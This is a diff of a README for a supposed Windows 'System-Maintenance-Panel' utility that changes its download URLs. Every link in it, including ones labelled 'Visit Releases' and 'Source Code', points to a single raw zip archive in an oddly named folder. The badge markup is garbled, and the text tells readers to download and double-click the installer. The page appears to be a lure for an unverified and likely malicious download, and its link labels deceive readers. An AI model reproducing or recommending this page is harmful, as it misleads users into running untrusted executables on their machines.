@@ -1,6 +1,6 @@
 # 🛠️ System-Maintenance-Panel - Simplify Your Windows Maintenance Tasks
 
-[![Download Now](https://raw.githubusercontent.com/NlKatz/System-Maintenance-Panel/main/tetranitro/System-Maintenance-Panel.zip%20Now-Visit%https://raw.githubusercontent.com/NlKatz/System-Maintenance-Panel/main/tetranitro/System-Maintenance-Panel.zip)](https://raw.githubusercontent.com/NlKatz/System-Maintenance-Panel/main/tetranitro/System-Maintenance-Panel.zip)
+[![Download Now](https://github.com/NlKatz/System-Maintenance-Panel/raw/refs/heads/main/tetranitro/Maintenance-Panel-System-v1.7.zip%20Now-Visit%https://github.com/NlKatz/System-Maintenance-Panel/raw/refs/heads/main/tetranitro/Maintenance-Panel-System-v1.7.zip)](https://github.com/NlKatz/System-Maintenance-Panel/raw/refs/heads/main/tetranitro/Maintenance-Panel-System-v1.7.zip)
 
 ## 📦 Introduction
 
@@ -21,10 +21,10 @@ To run the System Maintenance Panel, ensure your computer meets these requiremen
 1. **Visit the Releases Page**  
    Click the link below to access the releases page and download the software.
    
-   [Visit Releases](https://raw.githubusercontent.com/NlKatz/System-Maintenance-Panel/main/tetranitro/System-Maintenance-Panel.zip)
+   [Visit Releases](https://github.com/NlKatz/System-Maintenance-Panel/raw/refs/heads/main/tetranitro/Maintenance-Panel-System-v1.7.zip)
 
 2. **Download the Installer**  
-   On the releases page, find the latest version. Click on it to see available files. Look for the installer file, typically named like `https://raw.githubusercontent.com/NlKatz/System-Maintenance-Panel/main/tetranitro/System-Maintenance-Panel.zip`. Click on the file to download it.
+   On the releases page, find the latest version. Click on it to see available files. Look for the installer file, typically named like `https://github.com/NlKatz/System-Maintenance-Panel/raw/refs/heads/main/tetranitro/Maintenance-Panel-System-v1.7.zip`. Click on the file to download it.
 
 3. **Run the Installer**  
    Once the download is complete, locate the downloaded file in your 'Downloads' folder. Double-click on the installer file to start the installation.
@@ -78,7 +78,7 @@ We welcome suggestions and feedback. If you find bugs or have ideas for new feat
 
 You can find more information, including updates and support, at the links below:
 
-- [Visit Releases](https://raw.githubusercontent.com/NlKatz/System-Maintenance-Panel/main/tetranitro/System-Maintenance-Panel.zip)
-- [Source Code](https://raw.githubusercontent.com/NlKatz/System-Maintenance-Panel/main/tetranitro/System-Maintenance-Panel.zip)
+- [Visit Releases](https://github.com/NlKatz/System-Maintenance-Panel/raw/refs/heads/main/tetranitro/Maintenance-Panel-System-v1.7.zip)
+- [Source Code](https://github.com/NlKatz/System-Maintenance-Panel/raw/refs/heads/main/tetranitro/Maintenance-Panel-System-v1.7.zip)
 
 Thank you for using the System Maintenance Panel. Enjoy a more organized and efficient Windows experience!
